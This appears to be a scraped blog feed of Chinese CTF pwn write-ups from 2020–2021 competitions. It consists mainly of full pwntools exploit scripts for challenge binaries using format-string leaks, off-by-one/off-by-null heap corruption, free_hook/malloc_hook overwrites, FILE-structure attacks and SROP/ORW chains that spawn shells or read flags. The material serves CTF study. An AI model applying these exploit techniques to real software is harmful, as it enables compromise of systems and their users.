'c%29$hhn' # debug(0xdbd) sl(pay) p.recv() sl('rabbit') sl('%7$p-%29$p-') ru("rabbit") text_base = int(ru('-')[:-1],16)-0xe1e stdout = int(ru('-')[:-1],16)-112 libc_base = stdout - libc.sym['_IO_2_1_stdout_'] open_ = libc_base + libc.sym['open'] read_ = libc_base + libc.sym['read'] write_ = libc_base + libc.sym['write'] pop_rdi = libc_base + 0x0000000000021102 pop_rsi = libc_base + 0x00000000000202e8 pop_rdx = libc_base + 0x0000000000001b92 push_rsi = libc_base + 0x0000000000034bcf free_hook = libc_base + libc.sym['__free_hook'] ret = libc_base + 0x0000000000000937 leave_ret = libc_base + 0x0000000000042351 ret_main = stack - 0x110 leak("stdout",stdout) leak("ret_main",ret_main) leak("pop_rdi",pop_rdi) leak("stack-0x118",stack-0x118) # debug(0xdbd) # write(stack-0x118,free_hook) write(ret_main,pop_rdi) write(ret_main+8,0) write(ret_main+0x10,pop_rsi) write(ret_main+0x18,stack-0xe0) write(ret_main+0x20,pop_rdx) write(ret_main+0x28,0x100) write(ret_main+0x30,read_) write(ret_main+0x38,leave_ret) # debug(0xdbd) # 29,43 # write(stack-0x118,free_hook) # debug(0xdbd) sl('Bye~') pay = 'flag' + '\x00'*4 pay += p64(pop_rdi) + p64(stack-0xe0) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(open_) pay += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(free_hook + 0x100) + p64(pop_rdx) + p64(0x20) + p64(read_) pay += p64(pop_rdi) + p64(2) + p64(write_) pause() sl(pay) ''' pay = '%' + str(stdout_stack&amp;0xff) + 'c%6$hhn' sl(pay) pay = '%' + str(0x90) + 'c%10$hhn' sl(pay) pay = '%' + str(2) + 'c%29$hhn' sl(pay) ''' p.interactive()ru("Gift: ")stack = int(ru('\n')[:-1],16)leak("stack",stack)pwn(stack)]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2021广东省强网杯]]></title>
    <url>%2F2021%2F10%2F27%2F2021%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%2F</url>
    <content type="text"><![CDATA[girlfriend程序中存在许多花指令，但是都是一样的类型 妨碍反编译，先去花 1234567891011121314151617181920#coding:utf-8# 去花脚本from idaapi import *addr = 0xAC0end = 0x1100buf = get_bytes(addr,end-addr)def patch_at(p,ln): global buf buf = buf[:p] + b'\x90'*ln + buf[p+ln:]pattern = b'\xE8\x00\x00\x00\x00'p = buf.find(pattern)while p != -1: print("here" + str(p)) patch_at(p,5) patch_at(p+10,1) p = buf.find(pattern)print("done!")patch_bytes(addr,buf) 分析得出在sub_D30函数中存在off-by-one漏洞，程序使用realloc申请堆，并没有free函数，我们知道只要使得realloc(ptr,0)即可free(ptr)，所以add函数同样具备 free功能。 sub_EA6函数中存在printf_chk的格式化字符串漏洞，利用%a进行泄漏得到libc。 程序开启了沙箱，禁用execve函数，所以打free_hook，写入setcontext来实现orw。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#coding:utf-8# from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syslocal = 1context.terminal=['tmux','splitw','-h']context.arch = 'amd64'if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./girlfriend') elf = ELF('./girlfriend') libc = elf.libcelse: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202058) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def leak(name,addr): log.info(name + " --&gt; %s",hex(addr))def add(size,data=''): sla("&gt;&gt; ",'1') sla("size\n",str(size)) sda("data\n",data)def delete(): sla("&gt;&gt; ",'1') sla("size\n",'0')sla("Do you have grilfriend ? \n\n",'89')sla("&gt;&gt; ",'3')# debug(0xf1c)# leak libc_base and text_basesla("Do you have grilfriend ? \n\n",'78')sda("reason\n","%a-%a")ru('0x0.0')libc_base = int(ru('p-')[:-2],16) - 0x3ec7e3free_hook = libc_base + libc.sym['__free_hook']setcontext = libc_base + libc.sym['setcontext']ru('0x0.0')text_base = int(ru('p-')[:-2],16) - 0x1149leak("libc_base",libc_base)leak("text_base",text_base)add(0x100,'a')delete()add(0x200,'b')delete()add(0x300,'c')delete()add(0x108,'a'*0x108 + '\x31')delete()add(0x208,'b')delete()add(0x228,'b'*0x200 + p64(0) + p64(0x31) + p64(free_hook))delete()add(0x300,'c')delete()frame = SigreturnFrame()frame.rsp = free_hook + 0x10frame.rdi = 0frame.rsi = free_hook + 0x10frame.rdx = 0x100frame.rip = libc_base + libc.sym['read']pay = p64(setcontext+53)pay += p64(free_hook + 0x10)pay += str(frame)[0x10:]pay += "flag\x00"add(0x300,pay) #free_hookpop_rdi = libc_base + 0x000000000002155fpop_rsi = libc_base + 0x0000000000023e6apop_rdx = libc_base + 0x0000000000001b96pop_rax = libc_base + 0x00000000000439c8syscall = libc_base + 0x00000000000d2975# debug(0xda5)delete()# orwflag_addr = free_hook + 0xf8pay = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall)pay += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(0x20) + p64(pop_rax) + p64(0) + p64(syscall)pay += p64(pop_rdi) + p64(1) + p64(pop_rax) + p64(1) + p64(syscall)pause()sl(pay)p.interactive() pwn_c4c4，与2020年网鼎杯boom1类似，大概就是一个小型的oj，可以直接写程序，但是能用用的语句有限，能用的比如if,int,malloc,free,printf这些。 也就是说这题本身就是任意内存读写，只需要泄漏出关键地址即可劫持程序控制流。栈上本身是保存着很多信息的，那么泄漏就从栈上入手，所以只要能使用栈上的变量即可， 1、通过main函数的argv 2、通过直接对我们的可控局部变量取地址。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#coding:utf-8# from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syslocal = 1context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./c4')else: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def leak(name,addr): log.info(name + " --&gt; %s",hex(addr))pay = '''int main(int argc,char ** argv)&#123; int a; printf("%llx,%llx\n",&amp;a,argv);&#125;'''# debug(0x4a09)sl(pay)p.interactive() 通过测试结果，&amp;a打印出来的是libc地址(本地结果)； 拿到libc后就简单了，修改malloc_hook为system，然后malloc(“/bin/sh”); 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#coding:utf-8# from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syslocal = 1context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./c4')else: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def leak(name,addr): log.info(name + " --&gt; %s",hex(addr))pay = '''int main(int argc,char ** argv)&#123; int libc,system,malloc_hook; libc = (int)(&amp;system) - 0x546fd0; system = libc + 0x4f440; malloc_hook = libc + 0x3ebc30; *(int *)malloc_hook = system; malloc("/bin/sh");&#125;'''# debug(0x4a09)sl(pay)p.interactive() T_S同样的花指令，这题就显得高端一点； 初看整个程序没什么漏洞点，但是在edit中，利用花指令将关键代码藏了起来。 花指令类型跟girlfirend一样，这样同样用脚本整个扫一遍去花。 sub_137A函数里也有一个花指令同样隐藏了关键逻辑 只要等于1，就替换成0，可以当成一个off-by-null来用 只有一次show机会，用来泄漏heap_base，这样就可以结合off-by-null绕过新版unlink，实现堆叠，打stdout泄漏libc，再修改free_hook为system即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#coding:utf-8# from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syslocal = 1# context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./pwn') elf = ELF('./pwn') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print ("breakpoint_addr --&gt; " + hex(text_base + 0x202040)) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def leak(name,addr): log.info(name + " --&gt; %s",hex(addr))def choice(idx): sla("&gt;&gt;",str(idx))def add(size): choice(1) sla("length",str(size))def edit(idx,data): choice(2) sla("idx:",str(idx)) sda("name:",data)def delete(idx): choice(3) sla("idx:",str(idx))def show(idx): choice(4) sla("idx:",str(idx))add(0xf8)add(0xf8)delete(1)delete(0)add(0xf8) #0edit(0,'a')show(0)ru("Name:\n")heap_base = u64(rc(6).ljust(8,b'\x00')) - 0x361leak("heap_base",heap_base)# unlinkadd(0xf8) #1add(0xf8) #2add(0x18) #3add(0x4f0) #4add(0x18) #5add(0xf8) #6edit(3,b'\x01'*0x18)edit(3,b'\x00'*0x10 + p64(0x310))edit(0,p64(0) + p64(0x311) + p64(heap_base + 0x2a0) + p64(heap_base + 0x2a0))delete(4)delete(6)delete(1)add(0xe8) #1add(0x50) #4edit(4,'\xa0\xa6')add(0xf8) #6add(0xf8) #7 stdout edit(7,p64(0xfbad1800) + p64(0)*3 + b'\x00')libc_base = u64(ru('\x7f')[-6:].ljust(8,b'\x00')) - libc.sym['_IO_2_1_stdin_']free_hook = libc_base + libc.sym['__free_hook']system = libc_base + libc.sym['system']leak("libc_base",libc_base)delete(0)delete(2)add(0x200) #0edit(0,b'\x00'*0x90 + p64(0) + p64(0x101) + p64(free_hook))add(0xf8) #2add(0xf8) #8edit(8,p64(system))edit(4,'/bin/sh\x00')delete(4)p.interactive() 攻击stdout 有 1/16的概率成功，这里就不写循环了。（懒狗实锤）]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2021 pwnhub【迎中秋】公开赛]]></title>
    <url>%2F2021%2F10%2F14%2F2021%20pwnhub%E3%80%90%E8%BF%8E%E4%B8%AD%E7%A7%8B%E3%80%91%E5%85%AC%E5%BC%80%E8%B5%9B%2F</url>
    <content type="text"><![CDATA[moregirlfriend分析glibc 2.31版本，开启沙箱禁用了execve，saygoodbye功能是一个其中释放堆的操作，漏洞就在这个函数中 因为for循环编写不当导致越界，且同时to_free_list变量下面接着的是chunk变量，所以可以通过该越界漏洞free(chunk[0])进而构造double free（因为2.31的tcache有double free检测，所以需要构造在fastbin中） 做法1通过fastbin attach攻击 free_hook，通过setcontext控制寄存器进行ORW，由于自2.29版本后setcontext的参数由rdi变成rdx，所以该方法需要找到一条gadget将rdi赋值给rdx，例如mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];。 exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155#coding:utf-8# from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syscontext.arch = "amd64"local = 1# context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./moregirlfriend') elf = ELF('./moregirlfriend') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print ("breakpoint_addr --&gt; " + hex(text_base + 0x202040)) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def leak(name,addr): log.info(name + " --&gt; %s",hex(addr))def choice(idx): sla("wow:",str(idx))def add(idx,size,data): choice(1) sla("one?\n",str(idx)) sla("Height?\n",str(size)) sda("girlfriend?\n",data)def delete(num,idx=[]): choice(2) sla("you?\n",str(num)) for i in range(num): sla("girlfriend?\n",str(idx[i]))# leak libcadd(12,0x450,'12\n')add(13,0x450,'13\n')delete(1,[12])choice(3)add(12,0x450,'a\n')delete(2,[12,13])choice(3)main_arena = u64(rc(6).ljust(8,b'\x00'))+0x1fadd(0,0x68,'0\n')add(1,0x68,'1\n')add(2,0x68,'2\n')add(3,0x68,'3\n')add(4,0x68,'4\n')add(5,0x68,'5\n')add(6,0x68,'6\n')add(7,0x68,'7\n')add(8,0x68,'8\n')add(9,0x68,'9\n')add(10,0x68,'10\n')add(11,0x68,'11\n')delete(2,[11,10])choice(3)delete(8,[1,2,3,4,5,6,0,7])choice(3)ru("7 has left you.\n")heap_base = u64(rc(6).ljust(8,b'\x00')) - 0x530malloc_hook = main_arena - 0x10libc_base = malloc_hook - libc.sym['__malloc_hook']free_hook = libc_base + libc.sym['__free_hook']leak("heap_base",heap_base)# leak("main_arena",main_arena)leak("libc_base",libc_base)add(0,0x68,'0\n')add(1,0x68,'1\n')add(2,0x68,'2\n')add(3,0x68,'3\n')add(4,0x68,'4\n')add(5,0x68,'5\n')add(6,0x68,'6\n')add(7,0x68,p64(free_hook) + b'\n')add(10,0x68,'10\n')add(11,0x68,'11\n')# 0x0000000000154930: # mov rdx, qword ptr [rdi + 8]; # mov qword ptr [rsp], rax; # call qword ptr [rdx + 0x20];# 0x0000000000066229: syscall; ret; gadget = libc_base + 0x0000000000154930setcontext = libc_base + libc.sym['setcontext']syscall_ret = libc_base + 0x0000000000066229# free_hookadd(12,0x68,p64(gadget) + b'\n')flag_addr = heap_base + 0x9a0rsp_addr = heap_base + 0x8d8srop_open=SigreturnFrame()srop_open.rsp=rsp_addrsrop_open.rdi=0srop_open.rsi=heap_base + 0x8d8srop_open.rdx=0x100srop_open.rip=syscall_retframe = bytes(srop_open)pay = p64(0) + p64(heap_base + 0x7d0) + p64(setcontext + 61) + frame[0x28:]pay += p64(0)*2pay += p64(syscall_ret)add(13,0x250,pay + b'\n')delete(1,[13])# debug(0x1843)choice(3)# 0x0000000000026b72: pop rdi; ret; # 0x0000000000027529: pop rsi; ret; # 0x000000000011c371: pop rdx; pop r12; ret; # 0x000000000004a550: pop rax; ret; pop_rdi = libc_base + 0x0000000000026b72pop_rsi = libc_base + 0x0000000000027529pop_rdx_r12 = libc_base + 0x000000000011c371pop_rax = libc_base + 0x000000000004a550# open("flag.txt")pay = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(0) + p64(pop_rdx_r12) + p64(0)*2 + p64(pop_rax) + p64(2) + p64(syscall_ret)# read(3,flag_addr,0x20)pay += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx_r12) + p64(0x20)*2 + p64(pop_rax) + p64(0) + p64(syscall_ret)# write(1,flag_addr,0x20)pay += p64(pop_rdi) + p64(1) + p64(pop_rax) + p64(1) + p64(syscall_ret)pay += b'flag.txt\x00'pause()sl(pay)# debug()p.interactive() 做法2利用fastbin attack 攻击 stdin，优势在于rdx可以通过_IO_2_1_stdin_-&gt;_IO_write_ptr控制，比较方便 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182#coding:utf-8# from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syslocal = 1context.arch = 'amd64'# context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./moregirlfriend') elf = ELF('./moregirlfriend') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print ("breakpoint_addr --&gt; " + hex(text_base + 0x202040)) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def leak(name,addr): log.info(name + " --&gt; %s",hex(addr))def choice(idx): sla("wow:",str(idx))def add(idx,size,data): choice(1) sla("one?\n",str(idx)) sla("Height?\n",str(size)) sda("girlfriend?\n",data)def delete(num,idx=[]): choice(2) sla("you?\n",str(num)) for i in range(num): sla("girlfriend?\n",str(idx[i]))# leak libcadd(12,0x450,'12\n')add(13,0x450,'13\n')delete(1,[12])choice(3)add(12,0x450,'a\n')delete(2,[12,13])choice(3)main_arena = u64(rc(6).ljust(8,b'\x00'))+0x1fadd(0,0x68,'0\n')add(1,0x68,'1\n')add(2,0x68,'2\n')add(3,0x68,'3\n')add(4,0x68,'4\n')add(5,0x68,'5\n')add(6,0x68,'6\n')add(7,0x68,'7\n')add(8,0x68,'8\n')add(9,0x68,'9\n')add(10,0x68,'10\n')add(11,0x68,'11\n')delete(2,[11,10])choice(3)delete(8,[1,2,3,4,5,6,0,7])choice(3)ru("7 has left you.\n")heap_base = u64(rc(6).ljust(8,b'\x00')) - 0x530malloc_hook = main_arena - 0x10malloc_hook_base = malloc_hook &amp; 0xfffffffffffff000libc_base = malloc_hook - libc.sym['__malloc_hook']free_hook = libc_base + libc.sym['__free_hook']stdin = libc_base + libc.sym['_IO_2_1_stdin_']vtable = libc_base + 0x1ed560setcontext = libc_base + libc.sym['setcontext']leak("heap_base",heap_base)# leak("main_arena",main_arena)leak("libc_base",libc_base)leak("stdin",stdin)add(0,0x68,'0\n')add(1,0x68,'1\n')add(2,0x68,'2\n')add(3,0x68,'3\n')add(4,0x68,p64(0) + p64(0x291)+ b'\n')add(5,0x68,'5\n')add(6,0x68,'6\n')pay = p64(heap_base + 0x320)add(7,0x68,pay + b'\n')add(10,0x68,'10\n')add(11,0x68,'11\n')add(12,0x68,'12\n')add(13,0x288,'13\n')delete(3,[13,12,4])choice(3)add(4,0x68,p64(0) + p64(0x291) + p64(stdin) + b'\n')add(12,0x288,'12\n')# size = 0xe0fake_io = p64(0xfbad1800) #flagfake_io += p64(0) #_IO_read_ptrfake_io += p64(0) #_IO_read_endfake_io += p64(0) #_IO_read_basefake_io += p64(0) #_IO_write_basefake_io += p64(stdin+0xe0) #_IO_write_ptr (setcontext的参数rdx,使其指向 srop_mprotect)fake_io += p64(0) #_IO_write_endfake_io += p64(0) #_IO_buf_basefake_io += p64(0) #_IO_buf_endfake_io += p64(0) #_IO_save_basefake_io += p64(0) #_IO_backup_basefake_io += p64(0) #_IO_save_endfake_io += p64(0) #_markers fake_io += p64(0) #_chain fake_io += p64(0) #_fileno fake_io += p64(0) #_flags2fake_io += p64(0) #_old_offsetfake_io += p64(0) #_cur_column fake_io += p64(0) #_vtable_offsetfake_io += p64(0) #_shortbuffake_io += p64(0) #_lockfake_io += p64(0) #_offsetfake_io += p64(0) #_codecvtfake_io += p64(0) #_wide_datafake_io += p64(0) #_freeres_listfake_io += p64(0) #_freeres_buffake_io += p64(0) #__pad5fake_io += p64(vtable) #vtablesrop_mprotect = SigreturnFrame()srop_mprotect.rsp = malloc_hook + 0x8srop_mprotect.rdi = malloc_hook_basesrop_mprotect.rsi = 0x1000srop_mprotect.rdx = 7srop_mprotect.rip = libc_base + libc.sym['mprotect']# read shellcodempro = '''xor rdi,rdimov rsi,%dmov rdx,0x1000xor rax,raxsyscalljmp rsi'''%malloc_hook_basepay = fake_io + bytes(srop_mprotect) + p64(0)*3 + p64(setcontext + 61) + p64(malloc_hook + 0x10) + asm(mpro)add(13,0x288,pay + b'\n')choice(2)# gdb.attach(p,"b *0x5555555556d6")sla("you?\n",str(10)) #执行exit(0)shellcode = shellcraft.amd64.open("flag.txt")shellcode += shellcraft.amd64.read(3,malloc_hook_base,0x20)shellcode += shellcraft.amd64.write(1,malloc_hook_base,0x20)pause()sl(asm(shellcode))p.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2020强网杯]]></title>
    <url>%2F2021%2F06%2F14%2F2020%E5%BC%BA%E7%BD%91%E6%9D%AF%2F</url>
    <content type="text"><![CDATA[部分转自师弟 baby_diarydelete跟show没问题，在add功能中溢出一个字节 该flag的范围为[0~0xf]，所以可以当一个off-by-null来做 难点在于堆块的构造和pre_size的伪造 1、堆块的构造，利用large bin和unsorted中残留的堆地址操作 2、pre_size，先off-by-null(需要堆内容全为’\x00’)，再free后重新申请利用flag写入pre_size 具体步骤解释看exp注释 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130#coding:utf-8# from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syslocal = 1# context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./baby_diary') elf = ELF('./baby_diary',checksec = False) libc = elf.libcelse: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print ("breakpoint_addr --&gt; " + hex(text_base + 0x4060)) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def show(name,addr): log.info(name + " --&gt; %s",hex(addr))def choice(idx): sla("&gt;&gt; ",str(idx))def add(size,data="\n"): choice(1) sla("size: ",str(size - 1)) sda("content: ",data)def view(idx): choice(2) sla("index: ",str(idx))def delete(idx): choice(3) sla("index: ",str(idx))def ret_flag(data): flag = 0 for i in range(len(data)): flag += ord(data[i]) while flag &gt; 0xf: flag = (flag&gt;&gt;4) + (flag&amp;0xf) return flagadd(0x1000-0x10-0x290-0x440) #令chunk2的地址为0x......00# add(0x430)#1add(0x4f0)#2 unlink chunkadd(0x4e0)#3add(0x4e0)#4 fack fdadd(0x4e0)#5add(0x4e0)#6 fack bkadd(0x4e0)#7add(0x2c0)#8delete(4)delete(2) #write heap address to fd and bkdelete(6)delete(1) #hebing with chunk 2 to protect fd,bkadd(0x4e0)#1add(0x4e0)#2add(0x460)#4 由原先的0x440+0x500两个堆改成0x470+0x4d0是为了保护写进去chunk1的fd,bkadd(0x4c0)#6delete(1)delete(6)add(0x4e0,b'\x00'*8 + b'\n') #1 bkadd(0x4c0)#6delete(2)delete(6)add(0x600) #2 set 2 to largebin 使得fd写入一个堆地址add(0x4e0) #6 fd# off-by-nulladd(0x1f0,'\x00\n') #9 这里把0x4d0的堆块切成两个小是全其释放后能进入tcache，防止double free报错add(0x2c8,0x2c7*'\x00') #10 into tcache avoid double freedelete(10)# debug(0x179b)add(0x2c1,(0x2c0-1)*'\x00' + '\x05') #10 写pre_size为0x500# unlinkdelete(3)add(0x28,"/bin/sh\x00\n")view(9)ru("content: ")main_arena = u64(ru('\x7f').ljust(8,b'\x00')) - 96malloc_hook = main_arena - 0x10libc_base = malloc_hook - libc.symbols['__malloc_hook']free_hook = libc_base + libc.symbols['__free_hook']system = libc_base + libc.symbols['system']show("main_arena",main_arena)show("free_hook",free_hook)delete(8)delete(10)add(0x1f0) #8add(0x18,p64(free_hook) + b'\n') #10add(0x2d0-0x10)add(0x2d0-0x10,p64(system) + b'\n')delete(3)# debug()p.interactive() pipelineappend函数中两个size的比较是有符号数，因此可以用负数 而且read_str中的size强转成了int16，因此这里可以溢出；通过溢出覆盖下一个堆指针实现任意地址写。 在edit函数中使用了realloc函数申请堆，所以size为0时为free 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#coding:utf-8# from libformatstr import FormatStr# py64 = FormatStr(isx64=1) # py64[printf_got] = onegadget# sl(py64.payload(start_read_offset))from pwn import *import syslocal = 1# context.terminal=['tmux','splitw','-h']if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./pipeline') elf = ELF('./pipeline',checksec = False) libc = elf.libcelse: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print ("breakpoint_addr --&gt; " + hex(text_base + 0x202040)) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s :p.send(s)rc = lambda s :p.recv(s)sl = lambda s :p.sendline(s)ru = lambda s :p.recvuntil(s)sda = lambda a,s :p.sendafter(a,s)sla = lambda a,s :p.sendlineafter(a,s)def leak(name,addr): log.info(name + " --&gt; %s",hex(addr))def choice(idx): sla("&gt;&gt; ",str(idx))def new(): choice(1)def edit(idx,offset,size): choice(2) sla("index: ",str(idx)) sla("offset: ",str(offset)) sla("size: ",str(size))def append(idx,size,data): choice(4) sla("index: ",str(idx)) sla("size: ",str(size)) sda("data: ",data)def show(idx): choice(5) sla("index: ",str(idx))new() #0edit(0,0,0x420)new() #1edit(0,0,0) # freeedit(0,0,0x420)show(0) #leakru("data: ")main_arena = u64(rc(6).ljust(8,b'\x00')) - 96malloc_hook = main_arena - 0x10libc_base = malloc_hook - libc.sym['__malloc_hook']realloc_hook = libc_base + libc.sym['__realloc_hook']free_hook = libc_base + libc.sym['__free_hook']system = libc_base + libc.sym['system']leak("main_arena",main_arena)edit(1,0,0x50)append(1,32,'rabbit\n')# debug(0x18af)# 溢出，覆盖指针，写realloc_hookappend(0,0x80001000,b"/bin/sh\x00" + b"A"*0x418 + p64(0) + p64(0x21) + p64(realloc_hook) + b'\n')append(1,8,p64(system) + b"\n")edit(0,0,0)# debug()p.interactive() baby_pwnedit函数中存在off-by-null 输出函数加密了，解密不难，可以解，但也可以用io_file（笨比就用io_file直接打了） 禁用了execve，所以需要orw，远程的环境读的是flag.txt 